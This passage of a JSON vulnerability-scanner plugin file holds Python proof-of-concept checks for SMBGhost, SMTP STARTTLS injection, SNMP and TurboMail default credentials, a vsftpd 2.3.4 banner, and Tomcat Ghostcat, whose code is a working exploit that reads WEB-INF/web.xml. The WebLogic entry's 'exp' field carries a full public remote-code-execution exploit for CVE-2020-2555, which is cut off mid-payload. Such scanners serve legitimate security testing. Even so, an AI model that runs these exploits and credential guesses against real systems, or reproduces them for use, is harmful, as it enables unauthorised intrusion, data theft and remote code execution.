            "poc": "def _verify(host, port, vulns):\n    defaultport = 445\n    pocdict = {\n        \"vulnname\":\"smb_v3_ghost_rce\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        socket.setdefaulttimeout(8)\n        sock = socket.socket(socket.AF_INET)\n        payload = b'\\x00\\x00\\x00\\xc0\\xfeSMB@\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00$\\x00\\x08\\x00\\x01\\x00\\x00\\x00\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00x\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x02\\x10\\x02\"\\x02$\\x02\\x00\\x03\\x02\\x03\\x10\\x03\\x11\\x03\\x00\\x00\\x00\\x00\\x01\\x00&\\x00\\x00\\x00\\x00\\x00\\x01\\x00 \\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\n\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n        try:\n            sock.connect((host, port))\n        except:\n            sock.close()\n        sock.send(payload)\n        nb, = struct.unpack(\">I\", sock.recv(4))\n        res = sock.recv(nb)\n        if res[68:70] != b\"\\x11\\x03\" or res[70:72] != b\"\\x02\\x00\":\n            pass\n        else:\n            pocdict['isvul'] = True\n            pocdict['payload'] = str(payload)\n            pocdict['proof'] = 'res[68:70] != b\"\\x11\\x03\" or res[70:72] != b\"\\x02\\x00\"'\n            pocdict['response'] = res\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "smb",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "smtp_starttls_plaintext_inj",
            "description": "SMTP starttls明文命令注入(CVE-2011-0411)",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 443\n    pocdict = {\n        \"vulnname\":\"smtp_starttls_plaintext_inj\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        socket.setdefaulttimeout(8)\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        payload = 'STARTTLS\\r\\nRSET\\r\\n'\n        sock.connect((host, port))\n        sock.send(payload.encode())\n        response = sock.recv(1024).decode()\n        sock.close()\n        if \"Ready to start TLS\" in response:\n            pocdict['isvul'] = True\n            pocdict['payload'] = payload\n            pocdict['proof'] = 'Ready to start TLS'\n            pocdict['response'] = response\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "smtp",
            "param": "ip:port",
            "level": "low",
            "extfile": ""
        },
        {
            "vulname": "snmp_weak_detect",
            "description": "SNMP弱口令漏洞",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 161\n    pocdict = {\n        \"vulnname\":\"snmp_weak_detect\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        import pysnmp.hlapi\n        communities = ['public', 'private', 'cisco', 'root', 'admin']\n        result = ''\n        for community in communities:\n            iterator = pysnmp.hlapi.getCmd(pysnmp.hlapi.SnmpEngine(),\n                                           pysnmp.hlapi.CommunityData(community),\n                                           pysnmp.hlapi.UdpTransportTarget((host, port)),\n                                           pysnmp.hlapi.ContextData(),\n                                           pysnmp.hlapi.ObjectType(pysnmp.hlapi.ObjectIdentity('SNMPv2-MIB', 'sysDescr', 0)))\n\n            errorIndication, errorStatus, errorIndex, varBinds = next(iterator)\n            if errorIndication:  # SNMP engine errors\n                #print(errorIndication)\n                pass\n            else:\n                if errorStatus:  # SNMP agent errors\n                    #print('%s at %s' % (errorStatus.prettyPrint(), varBinds[int(errorIndex)-1] if errorIndex else '?'))\n                    pass\n                else:\n                    for varBind in varBinds:  # SNMP response contents\n                        result = ' = '.join([x.prettyPrint() for x in varBind])\n                pocdict['isvul'] = True\n                pocdict['payload'] = 'snmp data packet'\n                pocdict['proof'] = '{0} found'.format(community)\n                pocdict['response'] = result\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "snmp",
            "param": "ip:port",
            "level": "low",
            "extfile": ""
        },
        {
            "vulname": "tomcat_ajp_lfi",
            "description": "Tomcat AJP协议文件包含漏洞(CVE-2020-1938/CNVD-2020-10487)",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 8009\n    pocdict = {\n        \"vulnname\":\"tomcat_ajp_lfi\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        def pack_string(s):\n            if s == None:\n                return struct.pack(\">h\", -1)\n            l = len(s)\n            return struct.pack(\">H%dsb\" % l, l, s.encode('utf8'), 0)\n        def unpack(stream, fmt):\n            size = struct.calcsize(fmt)\n            buf = stream.read(size)\n            return struct.unpack(fmt, buf)\n        def unpack_string(stream):\n            size, = unpack(stream, \">h\")\n            if size == -1: # null string\n                return None\n            res, = unpack(stream, \"%ds\" % size)\n            stream.read(1) # \\0\n            return res\n        class NotFoundException(Exception):\n            pass\n        class AjpBodyRequest(object):\n            # server == web server, container == servlet\n            SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)\n            MAX_REQUEST_LENGTH = 8186\n            def __init__(self, data_stream, data_len, data_direction=None):\n                self.data_stream = data_stream\n                self.data_len = data_len\n                self.data_direction = data_direction\n            def serialize(self):\n                data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)\n                if len(data) == 0:\n                    return struct.pack(\">bbH\", 0x12, 0x34, 0x00)\n                else:\n                    res = struct.pack(\">H\", len(data))\n                    res += data\n                if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:\n                    header = struct.pack(\">bbH\", 0x12, 0x34, len(res))\n                else:\n                    header = struct.pack(\">bbH\", 0x41, 0x42, len(res))\n                return header + res\n            def send_and_receive(self, socket, stream):\n                while True:\n                    data = self.serialize()\n                    socket.send(data)\n                    r = AjpResponse.receive(stream)\n                    while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS:\n                        r = AjpResponse.receive(stream)\n\n                    if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4:\n                        break\n        class AjpForwardRequest(object):\n            _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(28)\n            REQUEST_METHODS = {'GET': GET, 'POST': POST, 'HEAD': HEAD, 'OPTIONS': OPTIONS, 'PUT': PUT, 'DELETE': DELETE, 'TRACE': TRACE}\n            # server == web server, container == servlet\n            SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)\n            COMMON_HEADERS = [\"SC_REQ_ACCEPT\",\n                              \"SC_REQ_ACCEPT_CHARSET\", \"SC_REQ_ACCEPT_ENCODING\", \"SC_REQ_ACCEPT_LANGUAGE\", \"SC_REQ_AUTHORIZATION\",\n                              \"SC_REQ_CONNECTION\", \"SC_REQ_CONTENT_TYPE\", \"SC_REQ_CONTENT_LENGTH\", \"SC_REQ_COOKIE\", \"SC_REQ_COOKIE2\",\n                              \"SC_REQ_HOST\", \"SC_REQ_PRAGMA\", \"SC_REQ_REFERER\", \"SC_REQ_USER_AGENT\"\n                              ]\n            ATTRIBUTES = [\"context\", \"servlet_path\", \"remote_user\", \"auth_type\", \"query_string\", \"route\", \"ssl_cert\", \"ssl_cipher\", \"ssl_session\", \"req_attribute\", \"ssl_key_size\", \"secret\", \"stored_method\"]\n            def __init__(self, data_direction=None):\n                self.prefix_code = 0x02\n                self.method = None\n                self.protocol = None\n                self.req_uri = None\n                self.remote_addr = None\n                self.remote_host = None\n                self.server_name = None\n                self.server_port = None\n                self.is_ssl = None\n                self.num_headers = None\n                self.request_headers = None\n                self.attributes = None\n                self.data_direction = data_direction\n            def pack_headers(self):\n                self.num_headers = len(self.request_headers)\n                res = \"\"\n                res = struct.pack(\">h\", self.num_headers)\n                for h_name in self.request_headers:\n                    if h_name.startswith(\"SC_REQ\"):\n                        code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1\n                        res += struct.pack(\"BB\", 0xA0, code)\n                    else:\n                        res += pack_string(h_name)\n\n                    res += pack_string(self.request_headers[h_name])\n                return res\n\n            def pack_attributes(self):\n                res = b\"\"\n                for attr in self.attributes:\n                    a_name = attr['name']\n                    code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1\n                    res += struct.pack(\"b\", code)\n                    if a_name == \"req_attribute\":\n                        aa_name, a_value = attr['value']\n                        res += pack_string(aa_name)\n                        res += pack_string(a_value)\n                    else:\n                        res += pack_string(attr['value'])\n                res += struct.pack(\"B\", 0xFF)\n                return res\n            def serialize(self):\n                res = \"\"\n                res = struct.pack(\"bb\", self.prefix_code, self.method)\n                res += pack_string(self.protocol)\n                res += pack_string(self.req_uri)\n                res += pack_string(self.remote_addr)\n                res += pack_string(self.remote_host)\n                res += pack_string(self.server_name)\n                res += struct.pack(\">h\", self.server_port)\n                res += struct.pack(\"?\", self.is_ssl)\n                res += self.pack_headers()\n                res += self.pack_attributes()\n                if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:\n                    header = struct.pack(\">bbh\", 0x12, 0x34, len(res))\n                else:\n                    header = struct.pack(\">bbh\", 0x41, 0x42, len(res))\n                return header + res\n            def parse(self, raw_packet):\n                stream = StringIO(raw_packet)\n                self.magic1, self.magic2, data_len = unpack(stream, \"bbH\")\n                self.prefix_code, self.method = unpack(stream, \"bb\")\n                self.protocol = unpack_string(stream)\n                self.req_uri = unpack_string(stream)\n                self.remote_addr = unpack_string(stream)\n                self.remote_host = unpack_string(stream)\n                self.server_name = unpack_string(stream)\n                self.server_port = unpack(stream, \">h\")\n                self.is_ssl = unpack(stream, \"?\")\n                self.num_headers, = unpack(stream, \">H\")\n                self.request_headers = {}\n                for i in range(self.num_headers):\n                    code, = unpack(stream, \">H\")\n                    if code > 0xA000:\n                        h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001]\n                    else:\n                        h_name = unpack(stream, \"%ds\" % code)\n                        stream.read(1) # \\0\n                    h_value = unpack_string(stream)\n                    self.request_headers[h_name] = h_value\n            def send_and_receive(self, socket, stream, save_cookies=False):\n                res = []\n                i = socket.sendall(self.serialize())\n                if self.method == AjpForwardRequest.POST:\n                    return res\n\n                r = AjpResponse.receive(stream)\n                assert r.prefix_code == AjpResponse.SEND_HEADERS\n                res.append(r)\n                if save_cookies and 'Set-Cookie' in r.response_headers:\n                    self.headers['SC_REQ_COOKIE'] = r.response_headers['Set-Cookie']\n\n                # read body chunks and end response packets\n                while True:\n                    r = AjpResponse.receive(stream)\n                    res.append(r)\n                    if r.prefix_code == AjpResponse.END_RESPONSE:\n                        break\n                    elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK:\n                        continue\n                    else:\n                        raise NotImplementedError\n                        break\n\n                return res\n\n        class AjpResponse(object):\n            _,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7)\n            COMMON_SEND_HEADERS = [\n                \"Content-Type\", \"Content-Language\", \"Content-Length\", \"Date\", \"Last-Modified\",\n                \"Location\", \"Set-Cookie\", \"Set-Cookie2\", \"Servlet-Engine\", \"Status\", \"WWW-Authenticate\"\n            ]\n            def parse(self, stream):\n                # read headers\n                self.magic, self.data_length, self.prefix_code = unpack(stream, \">HHb\")\n\n                if self.prefix_code == AjpResponse.SEND_HEADERS:\n                    self.parse_send_headers(stream)\n                elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK:\n                    self.parse_send_body_chunk(stream)\n                elif self.prefix_code == AjpResponse.END_RESPONSE:\n                    self.parse_end_response(stream)\n                elif self.prefix_code == AjpResponse.GET_BODY_CHUNK:\n                    self.parse_get_body_chunk(stream)\n                else:\n                    raise NotImplementedError\n\n            def parse_send_headers(self, stream):\n                self.http_status_code, = unpack(stream, \">H\")\n                self.http_status_msg = unpack_string(stream)\n                self.num_headers, = unpack(stream, \">H\")\n                self.response_headers = {}\n                for i in range(self.num_headers):\n                    code, = unpack(stream, \">H\")\n                    if code <= 0xA000: # custom header\n                        h_name, = unpack(stream, \"%ds\" % code)\n                        stream.read(1) # \\0\n                        h_value = unpack_string(stream)\n                    else:\n                        h_name = AjpResponse.COMMON_SEND_HEADERS[code-0xA001]\n                        h_value = unpack_string(stream)\n                    self.response_headers[h_name] = h_value\n\n            def parse_send_body_chunk(self, stream):\n                self.data_length, = unpack(stream, \">H\")\n                self.data = stream.read(self.data_length+1)\n\n            def parse_end_response(self, stream):\n                self.reuse, = unpack(stream, \"b\")\n\n            def parse_get_body_chunk(self, stream):\n                rlen, = unpack(stream, \">H\")\n                return rlen\n\n            @staticmethod\n            def receive(stream):\n                r = AjpResponse()\n                r.parse(stream)\n                return r\n\n        def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):\n            fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)\n            fr.method = method\n            fr.protocol = \"HTTP/1.1\"\n            fr.req_uri = req_uri\n            fr.remote_addr = target_host\n            fr.remote_host = None\n            fr.server_name = target_host\n            fr.server_port = 80\n            fr.request_headers = {\n                'SC_REQ_ACCEPT': 'text/html',\n                'SC_REQ_CONNECTION': 'keep-alive',\n                'SC_REQ_CONTENT_LENGTH': '0',\n                'SC_REQ_HOST': target_host,\n                'SC_REQ_USER_AGENT': 'Mozilla',\n                'Accept-Encoding': 'gzip, deflate, sdch',\n                'Accept-Language': 'en-US,en;q=0.5',\n                'Upgrade-Insecure-Requests': '1',\n                'Cache-Control': 'max-age=0'\n            }\n            fr.is_ssl = False\n            fr.attributes = []\n            return fr\n\n        class Tomcat(object):\n            def __init__(self, target_host, target_port):\n                self.target_host = target_host\n                self.target_port = target_port\n\n                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n                self.socket.connect((target_host, target_port))\n                self.stream = self.socket.makefile(\"rb\")\n\n            def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):\n                self.req_uri = req_uri\n                self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))\n                print(\"[+][{0}]请求ajp13协议路径{1}\".format(self.target_host, req_uri))\n                if user != None and password != None:\n                    self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = \"Basic \" + (\"%s:%s\" % (user, password)).encode('base64').replace('\\n', '')\n                for h in headers:\n                    self.forward_request.request_headers[h] = headers[h]\n                for a in attributes:\n                    self.forward_request.attributes.append(a)\n                responses = self.forward_request.send_and_receive(self.socket, self.stream)\n                if len(responses) == 0:\n                    return None, None\n                snd_hdrs_res = responses[0]\n                data_res = responses[1:-1]\n                if len(data_res) == 0:\n                    print(\"[-]{0}无响应数据，headers:{1}\\n\".format(snd_hdrs_res.response_headers))\n                return snd_hdrs_res, data_res\n        tomcat = Tomcat(host, port)\n        _,data = tomcat.perform_request('/asdf',attributes=[\n            {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']},\n            {'name':'req_attribute','value':['javax.servlet.include.path_info','/WEB-INF/web.xml']},\n            {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']},\n        ])\n        response = ''\n        for d in data:\n            response = d.data\n        if data:\n            pocdict['isvul'] = True\n            pocdict['payload'] = '''{'name':'req_attribute','value':['javax.servlet.include.path_info','/WEB-INF/web.xml']}'''\n            pocdict['proof'] = str(data)\n            pocdict['response'] = str(response)\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)\n",
            "exp": "",
            "sysname": "tomcat",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "turbomail_default_conf",
            "description": "TurboMail设计缺陷以及默认配置漏洞",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 9668\n    pocdict = {\n        \"vulnname\":\"turbomail_default_conf\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        tlib = telnetlib.Telnet(host, port, timeout=8)\n        # tlib.set_debuglevel(2)\n        # 登陆\n        payload = b\"login admin admin321\\r\\n\"\n        tlib.write(payload)\n        result = tlib.read_until(b\"200 login successfully\\r\\n\", timeout=8)\n        tlib.close()\n        if result.find(b\"200 login successfully\") != -1:\n            pocdict['isvul'] = True\n            pocdict['payload'] = payload\n            pocdict['proof'] = 'login successfully'\n            pocdict['response'] = result\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)\n",
            "exp": "",
            "sysname": "turbomail",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "vsftpd_v234_backdoor",
            "description": "vsFTPd v.2.3.4 后门漏洞",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 21\n    pocdict = {\n        \"vulnname\":\"vsftpd_v234_backdoor\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        socket.setdefaulttimeout(8)\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((host, port))\n        response = sock.recv(1024).decode('utf8', 'ignore')\n        #sock.send(b\"USER backdoored:)\\n\")\n        #sock.recv(1024)\n        #sock.send(b\"PASS invalid\\n\")\n        #sock.close()\n        if r\"vsFTPd 2.3.4\" in response:\n            pocdict['isvul'] = True\n            pocdict['payload'] = \"NULL\"\n            pocdict['proof'] = \"vsFTPd 2.3.4 found\"\n            pocdict['response'] = response\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "vsftpd",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "weblogic_Coherence_rce",
            "description": "Weblogic Coherence反序列化RCE(CVE-2020-2555)",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 7001\n    pocdict = {\n        \"vulnname\":\"weblogic_Coherence_rce\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        MSG = b't3 12.2.1\\nAS:255\\nHL:19\\nMS:10000000\\nPU:t3://us-l-breens:7001\\n\\n'\n        weblogic_version = [b\"12.1.3.0.0\",b\"12.2.1.3.0\",b\"12.2.1.4.0\", b\"3.7.1.0\"]\n        socket.setdefaulttimeout(8)\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((host, port))\n        sock.send(MSG)\n        res = sock.recv(100)\n        sock.close()\n        flag = False\n        for item in weblogic_version:\n            if item in res:\n                flag = True\n        if flag:\n            pocdict['isvul'] = True\n            pocdict['payload'] = MSG\n            pocdict['proof'] = \"version attached\"\n            pocdict['response'] = res\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "# Exploit Title: Oracle WebLogic Server 12.2.1.4.0  -  Remote Code Execution\n# Author: nu11secur1ty\n# Date: 2020-03-31\n# Vendor: Oracle\n# Software Link:  https://download.oracle.com/otn/nt/middleware/12c/122140/fmw_12.2.1.4.0_wls_Disk1_1of1.zip  \n# Exploit link: https://github.com/nu11secur1ty/Windows10Exploits/tree/master/Undefined/CVE-2020-2555\n# CVE: CVE-2020-2555\n\n\n[+] Credits: Ventsislav Varbanovski (nu11secur1ty)\n[+] Source:  readme from GitHUB\n\n\n[Exploit Program Code]\n--------------------------\n\n#!/usr/bin/python\n# @nu11secur1ty\nimport socket\nimport os\nimport sys\nimport struct\n\nif len(sys.argv) < 3:\n    print 'Usage: python %s <host> <port> </path/to/payload>' % os.path.basename(sys.argv[0])\n    sys.exit()\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.settimeout(5)\n\nserver_address = (sys.argv[1], int(sys.argv[2]))\nprint '[+] Connecting to %s port %s' % server_address\nsock.connect(server_address)\n\n# Send headers\nheaders='t3 12.2.1\\nAS:255\\nHL:19\\nMS:10000000\\nPU:t3://us-l-breens:7001\\n\\n'\nprint 'sending \"%s\"' % headers\nsock.sendall(headers)\n\ndata = sock.recv(1024)\nprint >>sys.stderr, 'received \"%s\"' % data\n\npayloadObj = open(sys.argv[3],'rb').read()\n\npayload='\\x00\\x00\\x09\\xf3\\x01\\x65\\x01\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x71\\x00\\x00\\xea\\x60\\x00\\x00\\x00\\x18\\x43\\x2e\\xc6\\xa2\\xa6\\x39\\x85\\xb5\\xaf\\x7d\\x63\\xe6\\x43\\x83\\xf4\\x2a\\x6d\\x92\\xc9\\xe9\\xaf\\x0f\\x94\\x72\\x02\\x79\\x73\\x72\\x00\\x78\\x72\\x01\\x78\\x72\\x02\\x78\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x70\\x70\\x70\\x70\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x06\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\x73\\x54\\x61\\x62\\x6c\\x65\\x45\\x6e\\x74\\x72\\x79\\x2f\\x52\\x65\\x81\\x57\\xf4\\xf9\\xed\\x0c\\x00\\x00\\x78\\x70\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\xe6\\xf7\\x23\\xe7\\xb8\\xae\\x1e\\xc9\\x02\\x00\\x09\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x4c\\x00\\x09\\x69\\x6d\\x70\\x6c\\x54\\x69\\x74\\x6c\\x65\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x0a\\x69\\x6d\\x70\\x6c\\x56\\x65\\x6e\\x64\\x6f\\x72\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0b\\x69\\x6d\\x70\\x6c\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x03\\x78\\x70\\x77\\x02\\x00\\x00\\x78\\xfe\\x01\\x00\\x00'\npayload=payload+payloadObj\npayload=payload+'\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\x73\\x54\\x61\\x62\\x6c\\x65\\x45\\x6e\\x74\\x72\\x79\\x2f\\x52\\x65\\x81\\x57\\xf4\\xf9\\xed\\x0c\\x00\\x00\\x78\\x70\\x72\\x00\\x21\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x65\\x65\\x72\\x49\\x6e\\x66\\x6f\\x58\\x54\\x74\\xf3\\x9b\\xc9\\x08\\xf1\\x02\\x00\\x07\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x5b\\x00\\x08\\x70\\x61\\x63\\x6b\\x61\\x67\\x65\\x73\\x74\\x00\\x27\\x5b\\x4c\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2f\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2f\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2f\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\x3b\\x78\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x49\\x6e\\x66\\x6f\\x97\\x22\\x45\\x51\\x64\\x52\\x46\\x3e\\x02\\x00\\x03\\x5b\\x00\\x08\\x70\\x61\\x63\\x6b\\x61\\x67\\x65\\x73\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0e\\x72\\x65\\x6c\\x65\\x61\\x73\\x65\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x5b\\x00\\x12\\x76\\x65\\x72\\x73\\x69\\x6f\\x6e\\x49\\x6e\\x66\\x6f\\x41\\x73\\x42\\x79\\x74\\x65\\x73\\x74\\x00\\x02\\x5b\\x42\\x78\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\xe6\\xf7\\x23\\xe7\\xb8\\xae\\x1e\\xc9\\x02\\x00\\x09\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\